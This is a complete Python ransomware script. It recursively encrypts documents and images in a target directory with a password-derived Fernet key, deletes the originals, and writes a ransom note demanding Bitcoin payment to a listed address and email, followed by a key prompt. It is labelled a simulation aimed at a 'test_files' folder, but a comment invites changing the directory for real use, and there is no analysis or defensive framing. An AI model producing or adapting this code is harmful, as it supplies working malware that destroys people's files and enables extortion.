import os
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import getpass

# Configuration
TARGET_DIR = "test_files"  # Directory to encrypt/decrypt (CHANGE THIS FOR REAL USE)
FILE_EXTENSIONS = ['.txt', '.doc', '.jpg', '.pdf', '.xls', '.png']  # Target file types
SALT = b'fixed_salt_1234'  # For key derivation
RANSOM_NOTE = """
!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

To decrypt your files, you must:
1. Send $500 USD in Bitcoin to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
2. Email transaction ID to: ransom@darkweb.com
3. Enter decryption key when prompted

Your decryption key will be provided after payment verification.
"""

# Derived encryption key from password
PASSWORD = "Abhishek!234@#$"  # Hardcoded decryption key

def derive_key(password):
    """Derive encryption key from password"""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=SALT,
        iterations=100000
    )
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

def encrypt_files():
    """Encrypt files in target directory"""
    key = derive_key(PASSWORD)
    fernet = Fernet(key)
    
    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            if any(file.endswith(ext) for ext in FILE_EXTENSIONS):
                path = os.path.join(root, file)
                
                try:
                    with open(path, 'rb') as f:
                        data = f.read()
                    
                    encrypted_data = fernet.encrypt(data)
                    with open(path + '.encrypted', 'wb') as f:
                        f.write(encrypted_data)
                    
                    os.remove(path)
                    print(f"Encrypted: {file}")
                        
                except Exception as e:
                    print(f"Error encrypting {file}: {str(e)}")

def decrypt_files(password):
    """Decrypt files in target directory"""
    try:
        key = derive_key(password)
        fernet = Fernet(key)
    except:
        return False
    
    success = True
    
    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            if file.endswith('.encrypted'):
                path = os.path.join(root, file)
                
                try:
                    with open(path, 'rb') as f:
                        data = f.read()
                    
                    decrypted_data = fernet.decrypt(data)
                    original_path = path[:-10]  # Remove .encrypted extension
                    with open(original_path, 'wb') as f:
                        f.write(decrypted_data)
                    
                    os.remove(path)
                    print(f"Decrypted: {file}")
                        
                except:
                    print(f"Decryption failed for {file}")
                    success = False
    return success

def create_ransom_note():
    """Create ransom note in target directory"""
    note_path = os.path.join(TARGET_DIR, "!!!READ_ME!!!.txt")
    with open(note_path, 'w') as f:
        f.write(RANSOM_NOTE)

if __name__ == "__main__":
    # Create target directory if missing
    os.makedirs(TARGET_DIR, exist_ok=True)
    
    # Simulate ransomware attack
    encrypt_files()
    create_ransom_note()
    
    print("\n" + "="*60)
    print(RANSOM_NOTE)
    print("="*60 + "\n")
    
    # Simulate victim recovery
    attempts = 3
    while attempts > 0:
        key_attempt = getpass.getpass("Enter decryption key: ")
        
        if decrypt_files(key_attempt):
            print("\nDECRYPTION SUCCESSFUL! Your files have been restored.")
            break
        else:
            attempts -= 1
            print(f"\nINVALID KEY! {attempts} attempts remaining.\n")
    
    if attempts == 0:
        print("\nPERMANENTLY ENCRYPTED! Send payment to recover files.")
